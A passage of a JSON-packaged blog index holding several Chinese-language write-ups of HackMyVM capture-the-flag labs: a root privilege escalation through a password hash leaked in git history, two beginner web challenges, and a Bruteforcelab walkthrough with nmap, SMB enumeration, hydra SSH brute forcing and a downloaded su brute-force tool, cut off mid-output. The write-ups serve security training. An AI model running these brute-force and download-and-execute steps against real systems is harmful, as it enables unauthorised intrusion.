mode 100644\nindex fca9fc6..0000000\n--- a/source2.txt\n+++ /dev/null\n@@ -1 +0,0 @@\n-root:ff855ad811c79e5fba458a575fac5b83\n\n# ... \u5176\u4ed6\u63d0\u4ea4\u8bb0\u5f55 ...\n```\n\n\u53d1\u73b0\u4e86 `root` \u7528\u6237\u7684\u51ed\u8bc1\u4fe1\u606f\uff1a`root:ff855ad811c79e5fba458a575fac5b83`\u3002\n\u8fd9\u91cc\u7684 `ff855ad811c79e5fba458a575fac5b83` \u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u54c8\u5e0c\u503c\u3002\n\n\u540c\u65f6\uff0c\u8054\u60f3\u5230\u4e4b\u524d\u5728 `/opt` \u76ee\u5f55\u4e0b\u53d1\u73b0\u7684 `guess` \u6587\u4ef6\u3002\u53ef\u4ee5\u5c1d\u8bd5\u8ba1\u7b97\u8be5\u6587\u4ef6\u7684MD5\u503c\uff1a\n\n```bash\nwelcome@7r1umph:~/RegView$ md5sum /opt/guess\nff855ad811c79e5fba458a575fac5b83  /opt/guess\n```\n\n\u53d1\u73b0 `guess` \u6587\u4ef6\u7684MD5\u503c\u4e0eGit\u5386\u53f2\u8bb0\u5f55\u4e2d\u6cc4\u9732\u7684 `root` \u5bc6\u7801\uff08\u6216\u54c8\u5e0c\uff09\u5b8c\u5168\u4e00\u81f4\u3002\u5728CTF\u4e2d\uff0c\u6709\u65f6\u54c8\u5e0c\u503c\u672c\u8eab\u5c31\u662f\u5bc6\u7801\u3002\u5c1d\u8bd5\u4f7f\u7528\u8fd9\u4e2a\u54c8\u5e0c\u503c\u4f5c\u4e3a `root` \u5bc6\u7801\u3002\n\n```bash\nwelcome@7r1umph:~/RegView$ su -\nPassword: ff855ad811c79e5fba458a575fac5b83\nroot@7r1umph:~# id\nuid=0(root) gid=0(root) groups=0(root)\n# \u6210\u529f\u5207\u6362\u5230 root \u7528\u6237\n```\n\n### 4.6 \u83b7\u53d6 Root Flag\n\n\u5207\u6362\u5230 `root` \u7528\u6237\u540e\uff0c\u5728\u5176\u5bb6\u76ee\u5f55\u4e0b\u67e5\u627e `root.txt`\u3002\n\n```bash\nroot@7r1umph:~# cat /root/root.txt\nflag{root-ff855ad811c79e5fba458a575fac5b83}\n```\n\n\u6210\u529f\u83b7\u53d6 `root.flag`\u3002\n\n## 5. \u603b\u7ed3\n\n\u672c\u6b21\u6e17\u900f\u6d4b\u8bd5\u901a\u8fc7\u4ee5\u4e0b\u6b65\u9aa4\u5b8c\u6210\uff1a\n\n1.  **\u4fe1\u606f\u6536\u96c6:** \u4f7f\u7528 `arp-scan` \u548c `nmap` \u53d1\u73b0\u76ee\u6807\u53ca\u5f00\u653e\u7aef\u53e3 (SSH, HTTP)\u3002`gobuster` \u53d1\u73b0Web\u76ee\u5f55\u7ed3\u6784\uff0c\u5305\u62ec\u6587\u4ef6\u4e0a\u4f20\u70b9 `/index.php` \u548c\u4e24\u4e2a\u76ee\u5f55 `/upload/`\u3001`/tmp/`\u3002\n2.  **\u521d\u59cb\u8bbf\u95ee:** \u5229\u7528\u6587\u4ef6\u4e0a\u4f20\u529f\u80fd\u4e2d\u5b58\u5728\u7684\u6761\u4ef6\u7ade\u4e89\u6f0f\u6d1e\uff0c\u4e0a\u4f20\u53cd\u5f39Shell\u7684PHP\u6587\u4ef6\uff0c\u5e76\u5728\u5176\u88ab\u79fb\u52a8/\u91cd\u547d\u540d\u4e4b\u524d\u901a\u8fc7\u8bbf\u95ee `/tmp/` \u76ee\u5f55\u4e0b\u7684\u4e34\u65f6\u6587\u4ef6\u89e6\u53d1\uff0c\u83b7\u5f97 `www-data` \u7528\u6237\u7684Shell\u3002\n3.  **\u6743\u9650\u63d0\u5347 (www-data -> welcome):** \u5728 `/opt` \u76ee\u5f55\u53d1\u73b0\u56fe\u7247\u6587\u4ef6 `yeyeye.png`\uff0c\u5206\u6790\u8bc6\u522b\u4e3a Dorabella Cipher\uff0c\u7834\u8bd1\u5f97\u5230 `welcome` \u7528\u6237\u7684\u5bc6\u7801 `yecongdong`\uff0c\u6210\u529f\u5207\u6362\u7528\u6237\u3002\n4.  **\u6743\u9650\u63d0\u5347 (welcome -> root):** \u5728 `welcome` \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u7684 `RegView` \u76ee\u5f55\u4e2d\u53d1\u73b0 `.git` \u4ed3\u5e93\u3002\u901a\u8fc7 `git log -p` \u67e5\u770b\u5386\u53f2\u8bb0\u5f55\uff0c\u53d1\u73b0\u4e00\u4e2a\u88ab\u5220\u9664\u7684\u6587\u4ef6\u66fe\u5305\u542b `root` \u7684\u5bc6\u7801\u54c8\u5e0c `ff855ad811c79e5fba458a575fac5b83`\u3002\u540c\u65f6\u786e\u8ba4\u8be5\u54c8\u5e0c\u4e0e `/opt/guess` \u6587\u4ef6\u7684MD5\u503c\u76f8\u540c\u3002\u4f7f\u7528\u8be5\u54c8\u5e0c\u4f5c\u4e3a\u5bc6\u7801\uff0c\u6210\u529f\u5207\u6362\u5230 `root` \u7528\u6237\u3002\n5.  **\u83b7\u53d6Flag:** \u5206\u522b\u5728 `welcome` \u548c `root` \u7528\u6237\u5bb6\u76ee\u5f55\u4e0b\u627e\u5230 `user.txt` \u548c `root.txt`\uff0c\u83b7\u53d6\u6700\u7ec8\u7684Flag\u3002sentence", "top": 0, "createdAt": 1751016505, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P17": {"htmlDir": "docs/post/Challenge 001 Base64 -bian-ma-jie-xi.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 001 Base64 \u7f16\u7801\u89e3\u6790", "postUrl": "post/Challenge%20001%20Base64%20-bian-ma-jie-xi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/17", "commentNum": 0, "wordCount": 1523, "description": "### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 001\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=001](https://hackmyvm.eu/challenges/challenge.php?c=001)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![\u6311\u6218001\u754c\u9762](https://7r1umphk.github.io/image/20250502145552213.png)\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u6211\u4eec\u770b\u5230\u9875\u9762\u4e0a\u7ed9\u51fa\u4e86\u4e00\u4e2a\u5b57\u7b26\u4e32\uff1a\n\n```\naG12e2Jhc2U2NGRlY29kZXJ9\n```\n\n\n\u4efb\u52a1\u663e\u7136\u662f\u9700\u8981\u5bf9\u8fd9\u4e2a\u5b57\u7b26\u4e32\u8fdb\u884c\u89e3\u7801\u6216\u89e3\u91ca\uff0c\u4ee5\u83b7\u53d6 Flag\u3002\n\n### \u5206\u6790\u4e0e\u6280\u672f\u8bf4\u660e\n\n\u7ed9\u51fa\u7684\u5b57\u7b26\u4e32 `aG12e2Jhc2U2NGRlY29kZXJ9` \u5177\u6709 **Base64 \u7f16\u7801**\u7684\u5178\u578b\u7279\u5f81\uff1a\n\n1.  **\u5b57\u7b26\u96c6:** \u5b83\u5b8c\u5168\u7531\u5927\u5199\u5b57\u6bcd (`A-Z`)\u3001\u5c0f\u5199\u5b57\u6bcd (`a-z`) \u548c\u6570\u5b57 (`0-9`) \u7ec4\u6210\u3002\u5b8c\u6574\u7684 Base64 \u5b57\u7b26\u96c6\u8fd8\u5305\u62ec `+` \u548c `/` \u5b57\u7b26\uff0c\u5e76\u4f7f\u7528 `=` \u4f5c\u4e3a\u586b\u5145\u7b26\uff0c\u4e0d\u8fc7\u8fd9\u4e9b\u7279\u6b8a\u5b57\u7b26\u5e76\u672a\u51fa\u73b0\u5728\u672c\u4f8b\u7684\u5b57\u7b26\u4e32\u4e2d\u3002\n2.  **\u7528\u9014:** \u9700\u8981\u660e\u786e\u7684\u662f\uff0cBase64 \u662f\u4e00\u79cd**\u7f16\u7801\uff08Encoding\uff09**\u65b9\u6848\uff0c\u800c\u4e0d\u662f**\u52a0\u5bc6\uff08Encryption\uff09**\u65b9\u6cd5\u3002\u5b83\u7684\u4e3b\u8981\u76ee\u7684\u662f\u5c06**\u4e8c\u8fdb\u5236\u6570\u636e**\uff08\u4f8b\u5982\u56fe\u7247\u3001\u53ef\u6267\u884c\u6587\u4ef6\u6216\u4efb\u610f\u5b57\u8282\u5e8f\u5217\uff09\u8f6c\u6362\u4e3a**\u7eaf\u6587\u672c**\u683c\u5f0f\uff0c\u4ee5\u4fbf\u5728\u53ea\u652f\u6301\u6587\u672c\u4f20\u8f93\u7684\u5a92\u4ecb\u4e0a\u4f20\u8f93\u3002\u8fd9\u5bf9\u4e8e\u50cf\u7535\u5b50\u90ae\u4ef6\uff08MIME \u534f\u8bae\uff09\u3001XML \u6216 JSON \u7b49\u57fa\u4e8e\u6587\u672c\u7684\u683c\u5f0f\u4e2d\u5d4c\u5165\u4e8c\u8fdb\u5236\u6570\u636e\u81f3\u5173\u91cd\u8981\u3002\n3.  **\u539f\u7406\u7b80\u8ff0:** Base64 \u7684\u5de5\u4f5c\u539f\u7406\u662f\u5c06\u8f93\u5165\u7684**\u6bcf 3 \u4e2a\u5b57\u8282\uff0824 \u6bd4\u7279\uff09**\u7684\u6570\u636e\u8f6c\u6362\u4e3a **4 \u4e2a Base64 \u5b57\u7b26**\u3002\u6bcf\u4e2a Base64 \u5b57\u7b26\u4ee3\u8868\u539f\u59cb\u6570\u636e\u4e2d\u7684 6 \u4e2a\u6bd4\u7279\uff08\u56e0\u4e3a 2 \u7684 6 \u6b21\u65b9\u7b49\u4e8e 64\uff0c\u5bf9\u5e94 Base64 \u7684 64 \u4e2a\u57fa\u672c\u5b57\u7b26\uff09\u3002\u5982\u679c\u8f93\u5165\u6570\u636e\u7684\u5b57\u8282\u6570\u4e0d\u662f 3 \u7684\u500d\u6570\uff0c\u901a\u5e38\u4f1a\u5728\u7f16\u7801\u7ed3\u679c\u7684\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u6216\u4e24\u4e2a `=` \u586b\u5145\u7b26\uff0c\u7528\u6765\u6307\u793a\u539f\u59cb\u6570\u636e\u7684\u7cbe\u786e\u957f\u5ea6\u3002\u672c\u4f8b\u4e2d\u5b57\u7b26\u4e32\u672b\u5c3e\u6ca1\u6709 `=`\uff0c\u8fd9\u8868\u793a\u539f\u59cb\u6570\u636e\u7684\u5b57\u8282\u6570\u6070\u597d\u662f 3 \u7684\u500d\u6570\u3002\n\n### \u89e3\u7801\u8fc7\u7a0b\n\n\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5de5\u5177\u6765\u89e3\u7801 Base64 \u5b57\u7b26\u4e32\u3002**CyberChef** \u662f\u4e00\u4e2a\u529f\u80fd\u5f3a\u5927\u4e14\u5e7f\u53d7\u6b22\u8fce\u7684\u9009\u62e9\uff1a\n\n1.  **\u8bbf\u95ee** CyberChef \u7f51\u7ad9: [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)\n2.  **\u8f93\u5165 (Input):** \u5c06\u5b57\u7b26\u4e32 `aG12e2Jhc2U2NGRlY29kZXJ9` \u7c98\u8d34\u5230\u201cInput\u201d\u8f93\u5165\u6846\u4e2d\u3002\n3.  **\u9009\u62e9\u64cd\u4f5c (Operations):** \u5728\u5de6\u4fa7\u7684\u64cd\u4f5c\u5217\u8868\u4e2d\u641c\u7d22 'From Base64'\uff0c\u7136\u540e\u5c06\u5176\u62d6\u62fd\u5230\u201cRecipe\u201d\u533a\u57df\u3002\n4.  **\u8f93\u51fa (Output):** \u201cOutput\u201d\u533a\u57df\u5c06\u81ea\u52a8\u663e\u793a\u89e3\u7801\u540e\u7684\u7ed3\u679c\u3002\n\n\u5f53\u7136\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u547d\u4ee4\u884c\u5de5\u5177\uff1a\n\n*   \u5728 Linux/macOS \u7cfb\u7edf\u4e0b\uff1a\n    ```bash\n    echo 'aG12e2Jhc2U2NGRlY29kZXJ9' | base64 -d\n    ```\n* \u6267\u884c\u89e3\u7801\u64cd\u4f5c\u540e\uff0c\u6211\u4eec\u5f97\u5230\u4ee5\u4e0b\u660e\u6587\u5b57\u7b26\u4e32\uff1a\n\n```\nhmv{base64decoder}\n```\n\n### \u7ed3\u679c\uff1aFlag\n\n\u89e3\u7801\u540e\u7684\u5b57\u7b26\u4e32\u5373\u4e3a\u672c\u6311\u6218\u7684 Flag\u3002\n\n```\nhmv{base64decoder}\n```\nsentence", "top": 0, "createdAt": 1751016510, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P18": {"htmlDir": "docs/post/Challenge 002 -yuan-ma-zhi-mi.html", "labels": ["HackMyVM_Challenge"], "postTitle": "Challenge 002 \u6e90\u7801\u4e4b\u5bc6", "postUrl": "post/Challenge%20002%20-yuan-ma-zhi-mi.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/18", "commentNum": 0, "wordCount": 1402, "description": "### \u6311\u6218\u4fe1\u606f\n\n*   **\u6311\u6218\u540d\u79f0/\u7f16\u53f7:** Challenge 002\n*   **\u6311\u6218\u94fe\u63a5:** [https://hackmyvm.eu/challenges/challenge.php?c=002](https://hackmyvm.eu/challenges/challenge.php?c=002)\n\n### \u521d\u59cb\u89c2\u5bdf\n\n![\u6311\u6218002\u521d\u59cb\u754c\u9762](https://7r1umphk.github.io/image/20250502150050288.png)\n\n\u8bbf\u95ee\u6311\u6218\u9875\u9762\u540e\uff0c\u9875\u9762\u5185\u5bb9\u63d0\u793a\u6211\u4eec\u9700\u8981\u8bbf\u95ee\u53e6\u4e00\u4e2a\u7279\u5b9a\u7684 URL \u6765\u83b7\u53d6 Flag\u3002\u540c\u65f6\uff0c\u9875\u9762\u660e\u786e\u6307\u51fa**\u65e0\u9700\u8fdb\u884c\u66b4\u529b\u7834\u89e3 (No Bruteforce required)**\u3002\n\n\u63d0\u4f9b\u7684\u76ee\u6807 URL \u4e3a\uff1a `http://momo.hackmyvm.eu/ch4ll3ng3002/`\n\n### \u5206\u6790\u4e0e\u6280\u672f\u8bf4\u660e\n\n\u6839\u636e\u6307\u793a\uff0c\u6211\u4eec\u8bbf\u95ee\u4e86\u76ee\u6807 URL `http://momo.hackmyvm.eu/ch4ll3ng3002/`\u3002\u8be5\u9875\u9762\u5448\u73b0\u4e00\u4e2a\u7b80\u5355\u7684 HTML \u8868\u5355\uff0c\u8981\u6c42\u7528\u6237\u8f93\u5165\u5bc6\u7801\u4ee5\u83b7\u53d6 Flag\u3002\n\n\u9274\u4e8e\u6311\u6218\u660e\u786e\u6392\u9664\u4e86\u66b4\u529b\u7834\u89e3\u7684\u53ef\u80fd\u6027\uff0c\u8fd9\u5f3a\u70c8\u6697\u793a\u6240\u9700\u5bc6\u7801\u5e76\u975e\u901a\u8fc7\u731c\u6d4b\u6216\u5b57\u5178\u653b\u51fb\u83b7\u5f97\uff0c\u800c\u662f\u53ef\u80fd\u4ee5\u67d0\u79cd\u975e\u663e\u800c\u6613\u89c1\u7684\u65b9\u5f0f\u9690\u85cf\u5728\u5f53\u524d\u9875\u9762\u6216\u5176\u5173\u8054\u8d44\u6e90\u4e2d\u3002\u5728 Web \u5b89\u5168\u9886\u57df\uff0c\u68c0\u67e5\u5ba2\u6237\u7aef\u4fa7\u8d44\u6e90\uff0c\u7279\u522b\u662f **HTML \u6e90\u4ee3\u7801**\uff0c\u662f\u53d1\u73b0\u6b64\u7c7b\u4fe1\u606f\u7684\u5e38\u7528\u6280\u672f\u624b\u6bb5\u3002\n\nWeb \u6d4f\u89c8\u5668\u5728\u6e32\u67d3\u9875\u9762\u65f6\u4f1a\u89e3\u6790 HTML \u4ee3\u7801\uff0c\u4f46\u6e90\u4ee3\u7801\u672c\u8eab\u5305\u542b\u4e86\u5f00\u53d1\u8005\u7f16\u5199\u7684\u6240\u6709\u6807\u8bb0\u548c\u6ce8\u91ca\u3002\u5f00\u53d1\u8005\u6709\u65f6\u4f1a\u5728\u6ce8\u91ca\u4e2d\u7559\u4e0b\u8c03\u8bd5\u4fe1\u606f\u3001\u8bf4\u660e\u751a\u81f3\u662f\u654f\u611f\u6570\u636e\u3002\n\n### \u89e3\u7801/\u6c42\u89e3\u8fc7\u7a0b\n\n\u6211\u4eec\u5728\u6d4f\u89c8\u5668\u4e2d\u5bf9\u76ee\u6807\u9875\u9762 `http://momo.hackmyvm.eu/ch4ll3ng3002/` \u6267\u884c\u201c\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u201d\u64cd\u4f5c\u3002\u4ed4\u7ec6\u68c0\u67e5\u6e90\u4ee3\u7801\u540e\uff0c\u5728 `<form>` \u5143\u7d20\u5185\u90e8\u53d1\u73b0\u4e86\u4e00\u6bb5\u88ab `<!--` \u548c `-->` \u5305\u88f9\u7684 **HTML \u6ce8\u91ca**\uff1a\n\n```html\n<!doctype html>\n<html lang='en'>\n<title>002</title>\nPassword to obtain the flag.\n    <form class='form-signin' action='passcheck.php' method='post'>\n      <input type='password' name='password' id='password' placeholder='Password' required>\n      <input type='submit' value='Send'>\n      <!-- isthisthepassword? -->  <!-- \u6b64\u5904\u53d1\u73b0\u6ce8\u91ca\u5185\u5bb9 -->\n    </form>\n  </body>\n</html>\n```\n\n\u8be5\u6ce8\u91ca\u5185\u5bb9\u4e3a\uff1a\n\n```\nisthisthepassword?\n```\n\n\u8fd9\u6bb5\u6587\u672c\u6781\u6709\u53ef\u80fd\u5c31\u662f\u5bfb\u627e\u7684\u5bc6\u7801\u3002\u6211\u4eec\u5c06\u6b64\u5b57\u7b26\u4e32 `isthisthepassword?` \u586b\u5165\u9875\u9762\u7684\u5bc6\u7801\u8f93\u5165\u6846\uff0c\u5e76\u63d0\u4ea4\u8868\u5355\u3002\n\n\u670d\u52a1\u5668\u9a8c\u8bc1\u901a\u8fc7\u540e\uff0c\u8fd4\u56de\u4e86\u5305\u542b Flag \u7684\u9875\u9762\u3002\n\n### \u7ed3\u679c\uff1aFlag\n\n\u6210\u529f\u83b7\u53d6\u7684 Flag \u4e3a\uff1a\n\n```\nHMV{thatwasreallyeazy}\n```\nsentence", "top": 0, "createdAt": 1751016512, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P19": {"htmlDir": "docs/post/hackmyvm-ba-chang--Bruteforcelab.html", "labels": ["HackMyVM"], "postTitle": "hackmyvm\u9776\u573a-Bruteforcelab", "postUrl": "post/hackmyvm-ba-chang--Bruteforcelab.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/19", "commentNum": 0, "wordCount": 7437, "description": "# \u7b80\u4ecb\n\n![image-20250322203846278](https://7r1umphk.github.io/image/20250322203846321.png)\n\n\u9776\u673a\uff1a[Bruteforcelab](https://hackmyvm.eu/machines/machine.php?vm=Bruteforcelab)\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.164\n \u672c\u673a IP\uff1a192.168.205.128\n \u77e5\u8bc6\u70b9\uff1a'\u65e8\u5728\u7528\u4e8e\u7ec3\u4e60\u66b4\u529b\u7834\u89e3\u548c SMB \u670d\u52a1\u5229\u7528\u3002'\n\n# \u4e00\uff1a\u4fe1\u606f\u6536\u96c6\n\n## 1.nmap\u626b\u63cf\n\n\u5f00\u626b\uff01\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n -p- -T4 192.168.205.164\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-03-22 20:39 CST\nNmap scan report for 192.168.205.164\nHost is up (0.00033s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT      STATE SERVICE     VERSION\n22/tcp    open  ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 1c:db:f8:92:72:c4:72:dc:24:c3:ca:7c:80:eb:f4:81 (RSA)\n|   256 7f:30:33:e2:f4:0d:87:41:5e:a3:24:de:57:c6:73:8b (ECDSA)\n|_  256 9a:9e:2f:53:e0:2b:b4:98:3f:34:95:53:56:87:a4:76 (ED25519)\n10000/tcp open  http        MiniServ 2.021 (Webmin httpd)\n|_http-server-header: MiniServ/2.021\n|_http-title: 200 &mdash; Document follows\n19000/tcp open  netbios-ssn Samba smbd 4\n19222/tcp open  netbios-ssn Samba smbd 4\nMAC Address: 08:00:27:DB:B7:99 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.33 ms 192.168.205.164\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 86.38 seconds\n```\n\n\u663e\u793a\u5f00\u653e\u4e8622\u300110000\u300119000\u300119222\u7aef\u53e3\uff0c\u5f00\u542f\u4e86ssh\u3001http\u3001smb\u670d\u52a1\n\n## 2.SMB\u670d\u52a1\u63a2\u6d4b\n\n\u4e2a\u4eba\u6bd4\u8f83\u559c\u6b22\u5148\u770bsmb\u670d\u52a1\u3002\u4f7f\u7528smbclient\u8fdb\u884c\u63a2\u6d4b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient -L //192.168.205.164 -p 19000 \nPassword for [WORKGROUP\\kali]:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        Test            Disk      \n        IPC$            IPC       IPC Service (Samba 4.13.13-Debian)\nReconnecting with SMB1 for workgroup listing.\ndo_connect: Connection to 192.168.205.164 failed (Error NT_STATUS_CONNECTION_REFUSED)\nUnable to connect with SMB1 -- no workgroup available\n\n```\n\n\u53d1\u73b0\u5b58\u5728Test\u5171\u4eab\u76ee\u5f55\uff0c\u8fde\u63a5\u540e\u53d1\u73b0\u5b58\u5728README.txt\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ smbclient //192.168.205.164/Test -p 19000\nPassword for [WORKGROUP\\kali]:\nTry 'help' to get a list of possible commands.\nsmb: \\> ls -la\nNT_STATUS_NO_SUCH_FILE listing \\-la\nsmb: \\> ls\n  .                                   D        0  Mon Mar 27 03:06:46 2023\n  ..                                  D        0  Mon Mar 27 02:12:02 2023\n  README.txt                          N      115  Mon Mar 27 03:06:46 2023\n\n                9232860 blocks of size 1024. 3032372 blocks available\n\n```\n\n\u67e5\u770bREADME.txt\uff0c\u53d1\u73b0\u5176\u5b58\u5728\u7528\u6237\u540d\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cat README.txt   \nHey Andrea listen to me, I'm going to take a break. I think I've setup this prototype for the SMB server correctly\n\n```\n\n*\u563f Andrea \u542c\u6211\u8bf4\uff0c\u6211\u8981\u4f11\u606f\u4e00\u4e0b\u3002\u6211\u60f3\u6211\u5df2\u7ecf\u6b63\u786e\u5730\u4e3a SMB \u670d\u52a1\u5668\u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u539f\u578b*\n\n# \u4e8c\uff1a\u4fe1\u606f\u5229\u7528\n\n\u4f7f\u7528hydra\u66b4\u529b\u7834\u89e3ssh\u670d\u52a1\uff0c\u5efa\u8bae\u4f7f\u7528xato-net-10-million-passwords-10000.txt\u5b57\u5178\uff0crockyou.txt\u5b57\u5178\u53ef\u80fd\u4f1a\u5b58\u5728\u7f3a\u5931\u7684\u53ef\u80fd\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ hydra -l andrea -P xato10000.txt ssh://192.168.205.164 -I -u -f -e nsr -t 64 \nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-22 20:55:54\n[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore\n[DATA] max 64 tasks per 1 server, overall 64 tasks, 10003 login tries (l:1/p:10003), ~157 tries per task\n[DATA] attacking ssh://192.168.205.164:22/\n[STATUS] 635.00 tries/min, 635 tries in 00:01h, 9401 to do in 00:15h, 31 active\n[22][ssh] host: 192.168.205.164   login: andrea   password: awesome\n[STATUS] attack finished for 192.168.205.164 (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-22 20:57:20\n\n```\n\n# \u4e09\uff1a\u83b7\u53d6shell\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ ssh andrea@192.168.205.164               \nThe authenticity of host '192.168.205.164 (192.168.205.164)' can't be established.\nED25519 key fingerprint is SHA256:jxCJlAEwfgAbyE4RC2RJnQM/Y0rUXe+Yt6q7Y69okUg.\nThis host key is known by the following other names/addresses:\n    ~/.ssh/known_hosts:19: [hashed name]\n    ~/.ssh/known_hosts:29: [hashed name]\n    ~/.ssh/known_hosts:30: [hashed name]\n    ~/.ssh/known_hosts:31: [hashed name]\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added '192.168.205.164' (ED25519) to the list of known hosts.\nandrea@192.168.205.164's password: \nLinux LAB-Bruteforce 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64\n\nThe programs included with the Debian GNU/Linux system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nDebian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent\npermitted by applicable law.\nLast login: Sun Mar 26 21:26:42 2023 from 192.168.1.84\nandrea@LAB-Bruteforce:~$ id\nuid=1001(andrea) gid=1001(andrea) groups=1001(andrea)\nandrea@LAB-Bruteforce:~$ whoami \nandrea\nandrea@LAB-Bruteforce:~$ hostname -I\n192.168.205.164 \n\n```\n\n# \u56db\uff1a\u63d0\u6743-root\n\n\u4f7f\u7528suFirce\u5de5\u5177\u76f4\u63a5\u7206\u7834root\n\n## 1.\u51c6\u5907\n\n```bash\nandrea@LAB-Bruteforce:~$ cd /tmp/\nandrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/suForce\n--2025-03-22 14:05:42--  http://192.168.205.128/suForce\nConnecting to 192.168.205.128:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 2430 (2.4K) [application/octet-stream]\nSaving to: \u2018suForce\u2019\n\nsuForce                           100%[============================================================>]   2.37K  --.-KB/s    in 0s      \n\n2025-03-22 14:05:42 (4.78 MB/s) - \u2018suForce\u2019 saved [2430/2430]\n\nandrea@LAB-Bruteforce:/tmp$ wget 192.168.205.128/xato10000.txt\n--2025-03-22 14:05:54--  http://192.168.205.128/xato10000.txt\nConnecting to 192.168.205.128:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 76497 (75K) [text/plain]\nSaving to: \u2018xato10000.txt\u2019\n\nxato10000.txt                     100%[============================================================>]  74.70K  --.-KB/s    in 0s      \n\n2025-03-22 14:05:54 (379 MB/s) - \u2018xato10000.txt\u2019 saved [76497/76497]\n\nandrea@LAB-Bruteforce:/tmp$ chmod +x suForce \n\n```\n\n## 2.\u649e\u51fb\n\n```bash\nandrea@LAB-Bruteforce:/tmp$ ./suForce -u root -w xato10000.txt \n            _____                          \n ___ _   _ |  ___|__  _ __ ___ ___   \n/ __| | | || |_ / _ \\| '__/ __/ _ \\ \n\\__ \\ |_| ||  _| (_) | | | (_|  __/  \n|___/\\__,_||_|  \\___/|_|  \\___\\___|  \n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n code: d4t4s3c     version: v1.0.0\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n\ud83c\udfaf Username | 